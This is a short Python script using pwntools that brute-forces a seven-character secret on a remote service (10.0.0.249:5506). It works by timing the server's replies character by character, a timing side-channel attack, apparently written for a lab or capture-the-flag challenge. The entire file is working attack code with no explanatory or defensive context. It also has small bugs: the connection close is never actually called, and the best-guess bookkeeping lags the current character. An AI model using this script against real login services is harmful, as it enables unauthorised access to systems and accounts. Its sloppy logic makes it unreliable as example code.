#!/usr/bin/python3

from pwn import *

def brute_force():
	remote_IP = '10.0.0.249'
	remote_port = '5506'

	guess = ['A', 'A', 'A', 'A', 'A', 'A', 'A']
	answer = "Incorrect, goodbye.\n"
	char_check = 0
	best_guess = ['A', 'A', 'A', 'A', 'A', 'A', 'A']
	best_time = 0

	while answer != "Correct!\n" and char_check < 7:
		for ascii_enc in range(32, 127):  # Loops through the ascii characters
			guess_str = list_to_str(guess)
			r = remote(remote_IP, remote_port)
			answer = r.recvline()
			start = time.time()
			r.sendline(guess_str + "\n")
			answer = r.recvline()
			end = time.time()
			elapsed_time = end - start
			r.close
			print("Guess: " + guess_str + " time: " + str(elapsed_time))
			#time.sleep(.01)
			if elapsed_time > best_time:
				best_time = elapsed_time
				best_guess[char_check] = guess[char_check]
				best_str = list_to_str(best_guess)
				print("New best")
			guess[char_check] = chr(ascii_enc)
			print("Best time: " + str(best_time) + " Best guess: " + best_str)
		guess[char_check] = best_guess[char_check]
		char_check += 1
	
	print(list_to_str(best_guess))


def list_to_str(list):
	str1 = ""
	for char in range(0, len(list)):
		str1 += list[char]
	return str1



if __name__ == "__main__":
	brute_force()

